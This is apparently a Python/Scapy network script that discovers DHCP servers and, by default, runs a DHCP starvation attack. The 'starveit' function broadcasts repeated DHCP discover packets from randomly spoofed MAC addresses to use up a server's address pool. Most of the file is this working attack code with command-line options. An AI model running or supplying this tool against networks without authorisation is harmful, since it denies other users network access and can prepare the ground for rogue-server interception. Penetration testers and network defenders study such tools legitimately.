#!/usr/bin/env python3
# python dhcp_script_final.py -i eth0 -dhcpdiscover
# python dhcp_script_final.py -i eth0 -reps 255 -server_ip 192.168.1.1

import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

def dhcpdiscover(iface,
                 timeout,
                 debug):

    #get mac address
    _, hw = get_if_raw_hwaddr(iface)

    #craft dhcp discover packet
    dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) / BOOTP(chaddr=hw) / DHCP(options=[("message-type","discover"), "end"])

    print("Sending DHCP discover on", iface + ".", str(timeout) + "s delay.")

    #sending packets
    #multi=True to make Scapy wait for more answer packets after the first response is received
    ans, unans = srp(dhcp_discover, multi=True, timeout = timeout, verbose=0)
    servers = {}

    #check for dhcp offer
    for snd, rcv in ans:
        offer = False

        for opt in rcv.payload.payload.payload.payload.options:
            if opt[0] == 'message-type':
                if opt[1] == 2:
                    offer = True
                
        if not offer:
            continue

        if not rcv.src in servers:
            servers[rcv.src] = {'MAC': rcv.src, 'IP': rcv.payload.src, 'offer': rcv.payload.payload.payload.yiaddr, 'options': rcv.payload.payload.payload.payload.options}

    print('')
    print(len(ans), "replies from", len(servers), "(based on MAC address) DHCP server(s)")
    print('')
    
    if len(servers) > 1:
        print("More than one DHCP servers found.")
        print('')

    #output information
    for mac in servers:
        server = servers[mac]
        print("DHCP server", mac)
        print("  Server ip:", server['IP'])
        print("  Offer ip:", server['offer'])
        print("  Options:")
        for opt in server['options']:
            if len(str(opt[0])) <= 5:
                break
            if opt[0] == 'message-type':
                print('    message-type:', DHCPTypes[opt[1]])
            else:
                print('    ' + str(opt[0])+':', opt[1])
        print('')

    #debugging purposes
    if debug:
        dhcp_discover.show()
        
def starveit(iface,
            server_ip,
            dst_mac,
            timeout,
            repetition,
            debug):
    
    for i in range(repetition):
        #get random mac address
        fakeMAC = str(RandMAC())
        
        dhcp_options=[("message-type","discover"),"end"]
        
        if server_ip != "":
            dhcp_options.insert(1, ("server_ip",server_ip))

        #craft dhcp discover packet
        dhcp_discover = Ether(src=fakeMAC, dst='ff:ff:ff:ff:ff:ff',  type=0x0800)\
                        / IP(src='0.0.0.0', dst='255.255.255.255')\
                        / UDP(dport=67,sport=68)\
                        / BOOTP(op=1, chaddr=fakeMAC)\
                        / DHCP(options=dhcp_options)

        sendp(dhcp_discover, verbose=0)

        #debugging purposes
        if debug:
            dhcp_discover.show()
            
        #timeout
        time.sleep(timeout)
        
    print("Sent", repetition, "DHCP discover packet(s) on interface", iface)

#cli
if __name__=="__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument('-i', metavar='INTERFACE_NAME', required=True, 
                        help="local network interface")

    parser.add_argument('-dhcpdiscover', action='store_true', required=False,
                        help="Discover dhcp servers on current network")

    parser.add_argument('-reps',
                        metavar='INT',
                        type=int, 
                        default=10,
                        help="No of repetitions, sometime packet get lost(10)")

    parser.add_argument('-server_ip', default="", required=False, 
                        help="DHCP server ip, eg: 192.168.27.254")

    parser.add_argument('-dst_mac', default="ff:ff:ff:ff:ff:ff", required=False, 
                        help="Destination DHCP MAC address (ff:ff:ff:ff:ff:ff)")

    parser.add_argument('-timeout', type=float, default=0.1, required=False, 
                        help="seconds to wait between a request and another(0.1)")

    parser.add_argument('-debug', action='store_true', required=False,
                        help="print packets")

    #disable Scapy’s check with conf.checkIPaddr = False before sending the stimulus.
    conf.checkIPaddr = False

    args = parser.parse_args()

    #interface
    iface = args.i

    #dhcpdiscover flag
    if args.dhcpdiscover:
        dhcpdiscover(iface,
                     timeout = args.timeout, 
                     debug = args.debug)
    else:
        starveit(iface,
            server_ip = args.server_ip,
            dst_mac = args.dst_mac,
            timeout = args.timeout,
            repetition = args.reps,
            debug = args.debug)
